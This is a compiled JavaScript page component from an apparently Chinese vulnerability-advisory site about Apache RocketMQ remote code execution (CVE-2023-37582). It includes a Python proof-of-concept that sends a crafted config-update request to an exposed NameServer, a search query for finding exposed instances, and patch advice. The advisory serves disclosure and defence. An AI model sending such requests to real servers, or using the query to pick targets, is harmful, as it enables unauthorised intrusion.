import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as d,c as s,a as n,b as e,d as l,e as o}from"./app-58e4a7d6.js";const r={},c=o(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>此漏洞是由于 CVE-2023-33246 补丁未修复完全，当 RocketMQ 的NameServer 组件暴露在外网，且缺乏有效的身份认证时，攻击者可以利用更新配置功能，以 RocketMQ 运行的系统用户身份执行任意命令。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>RocketMQ &lt; 4.9.7
RocketMQ &lt; 5.1.2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;RocketMQ&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>import socket
import binascii
 
client = socket.socket()
client.settimeout(5)
 
client.connect((target_ip,target_port))
## make payload
json = &#39;{&quot;code&quot;:318,&quot;extFields&quot;:{&quot;test&quot;:&quot;RockedtMQ&quot;},&quot;flag&quot;:0,&quot;language&quot;:&quot;JAVA&quot;,&quot;opaque&quot;:266,&quot;serializeTypeCurrentRPC&quot;:&quot;JSON&quot;,&quot;version&quot;:433}&#39;.encode(&#39;utf-8&#39;)
 
body=(&#39;Thanks DawnT0wn&#39;).encode(&#39;utf-8&#39;)
json_lens = int(len(binascii.hexlify(json).decode(&#39;utf-8&#39;))/2)
head1 = &#39;00000000&#39;+str(hex(json_lens))[2:]
all_lens = int(4+len(binascii.hexlify(body).decode(&#39;utf-8&#39;))/2+json_lens)
head2 = &#39;00000000&#39;+str(hex(all_lens))[2:]
data = head2[-8:]+head1[-8:]+binascii.hexlify(json).decode(&#39;utf-8&#39;)+binascii.hexlify(body).decode(&#39;utf-8&#39;)
## send
client.send(bytes.fromhex(data))
data_recv = client.recv(1024)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2><p>目前官方已发布安全版本，建议受影响用户升级至：</p><ul><li>RocketMQ 5.x &gt;= 5.1.2</li><li>RocketMQ 4.x &gt;= 4.9.7</li></ul>`,12),u={href:"https://rocketmq.apache.org/download/%EF%BC%8C%E5%90%8C%E6%97%B6%E5%BB%BA%E8%AE%AE%E5%B0%86",target:"_blank",rel:"noopener noreferrer"};function v(h,m){const i=t("ExternalLinkIcon");return d(),s("div",null,[c,n("p",null,[e("官方补丁下载地址："),n("a",u,[e("https://rocketmq.apache.org/download/，同时建议将"),l(i)]),e(" NameServer、Broker 等组件部署在内网，并增加权限认证。")])])}const p=a(r,[["render",v],["__file","Apache RocketMQ 远程代码执行漏洞 CVE-2023-37582.html.vue"]]);export{p as default};
